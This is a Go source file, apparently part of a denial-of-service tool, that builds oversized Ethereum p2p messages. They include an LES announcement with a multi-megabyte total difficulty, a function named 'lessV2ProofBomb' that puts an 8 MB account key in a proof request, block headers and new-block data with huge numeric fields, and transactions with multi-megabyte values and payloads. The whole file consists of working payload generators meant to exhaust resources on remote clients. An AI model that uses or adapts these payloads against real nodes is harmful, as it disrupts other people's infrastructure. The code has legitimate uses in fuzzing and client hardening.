package main

import (
	"crypto/rand"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/les"
	"math/big"
	rand2 "math/rand"
)

// Returns a very large big.Int
func veryLargeNumber(megabytes int) *big.Int {
	buf := make([]byte, megabytes*1024*1024)
	rand.Read(buf)
	bigint := new(big.Int)
	bigint.SetBytes(buf)
	return bigint
}
func veryLargeBuffer(megabytes int) []byte {
	buf := make([]byte, megabytes*1024*1024)
	rand.Read(buf)
	return buf
}

// Returns a random hash
func randHash() common.Hash {
	var h common.Hash
	rand.Read(h[:])
	return h
}

func largeLesAccouncement() *announceData {

	return &announceData{
		Hash:       randHash(),
		Update:     keyValueList{},
		Number:     1337,
		Td:         veryLargeNumber(5),
		ReorgDepth: 25000,
	}
}

type proofV2Req struct {
	ReqID uint64
	Reqs  []les.ProofReq
}

func lessV2ProofBomb(remoteBlockHash common.Hash) *proofV2Req {

	return &proofV2Req{
		ReqID: rand2.Uint64(),
		Reqs: []les.ProofReq{
			{Key: randHash().Bytes(),
				AccKey:    veryLargeBuffer(8),
				BHash:     remoteBlockHash,
				FromLevel: 0,
			},
		},
	}
}

func largeHeader() *types.Header {
	return &types.Header{
		MixDigest:   randHash(),
		ReceiptHash: randHash(),
		TxHash:      randHash(),
		Nonce:       types.BlockNonce{},
		Extra:       []byte{},
		Bloom:       types.Bloom{},
		GasUsed:     0,
		Coinbase:    common.Address{},
		GasLimit:    0,
		UncleHash:   randHash(),
		Time:        1337,
		ParentHash:  randHash(),
		Root:        randHash(),
		Number:      veryLargeNumber(2),
		Difficulty:  veryLargeNumber(2),
	}
}
func randomHeader() *types.Header {
	return &types.Header{
		MixDigest:   randHash(),
		ReceiptHash: randHash(),
		TxHash:      randHash(),
		Nonce:       types.BlockNonce{},
		Extra:       []byte{},
		Bloom:       types.Bloom{},
		GasUsed:     0,
		Coinbase:    common.Address{},
		GasLimit:    0,
		UncleHash:   randHash(),
		Time:        1337,
		ParentHash:  randHash(),
		Root:        randHash(),
		Number:      big.NewInt(rand2.Int63()),
		Difficulty:  big.NewInt(rand2.Int63()),
	}
}

func largeNewBlockData() *newBlockData {
	return &newBlockData{
		Block: types.NewBlock(
			largeHeader(),
			[]*types.Transaction{},
			[]*types.Header{},
			[]*types.Receipt{},
		),
		TD: veryLargeNumber(2),
	}
}
func randomNewBlockData() *newBlockData {
	return &newBlockData{
		Block: types.NewBlock(
			randomHeader(),
			[]*types.Transaction{},
			[]*types.Header{},
			[]*types.Receipt{},
		),
		TD: big.NewInt(50000),
	}
}

func randomBlockHashes(n int) *newBlockHashesData {
	var data = make(newBlockHashesData, n)
	for i := 0; i < n; i++ {
		data[i].Hash = randHash()
		data[i].Number = uint64(i % 32)
	}
	return &data
}

func largeTxs() *[]types.Transaction {
	var data = make([]types.Transaction, 3)
	data[0] = *(types.NewTransaction(0, common.Address{}, veryLargeNumber(3), 0, nil, nil))
	data[1] = *(types.NewTransaction(0, common.Address{}, nil, 0, veryLargeNumber(3), nil))

	data[2] = *(types.NewTransaction(0, common.Address{}, nil, 0, nil, veryLargeBuffer(3)))

	return &data
}
